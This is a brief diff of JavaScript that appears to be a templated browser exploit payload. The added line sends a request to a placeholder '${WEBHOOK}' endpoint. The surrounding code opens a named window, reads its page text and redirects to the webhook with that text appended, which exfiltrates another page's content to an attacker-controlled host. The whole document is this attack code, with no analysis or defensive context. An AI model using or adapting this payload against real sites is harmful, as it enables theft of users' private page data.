@@ -35,6 +35,7 @@ function post(url, data) {
 }
 
 try {
+  post("${WEBHOOK}", "profile");
   const profile = window.open("", "${OPEN}");
   window.location = "${WEBHOOK}?" + profile.document.body.innerText;
 } catch (error) {
